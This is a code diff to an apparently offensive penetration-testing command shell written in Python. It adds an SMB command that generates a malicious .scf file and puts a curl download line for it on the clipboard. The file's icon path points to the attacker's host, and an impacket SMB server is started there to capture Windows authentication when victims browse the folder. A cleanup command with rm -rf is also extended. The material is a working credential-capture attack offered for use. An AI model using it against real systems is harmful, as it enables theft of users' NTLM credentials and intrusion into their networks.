@@ -1193,8 +1193,25 @@ class LazyOwnShell(Cmd):
 
     def do_smbserver(self, line):
         """Lazy imacket smbserver"""
-        print("    [*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
-        os.system("sudo impacket-smbserver smbfolder $(pwd) -smb2support")
+        lhost = self.params["lhost"]
+
+        if not lhost:
+            print(f"    {YELLOW} [?] lhost must be set.{RESET}")
+            return
+        revshell = f"""[Shell]
+        Command=2
+        IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
+        [Taskbar]
+        Command=ToggleDesktop
+        """.replace('        ','')
+        print(f"    [*] Try... echo '{revshell}' > sessions/file.scf ")
+        os.system(f"echo '{revshell}' > sessions/file.scf ")
+        print(f"    [*] echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
+        print(f"    [*] command copied to clipboard")
+        print(f"    [*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
+        os.system(f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip")
+        os.system("cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support")
+        return
 
     def do_sqlmap(self, line):
         """Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter"""
@@ -1605,7 +1622,7 @@ class LazyOwnShell(Cmd):
         return
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm sessions/*.ps1 sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
+        os.system("rm sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
         print(f"    {GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
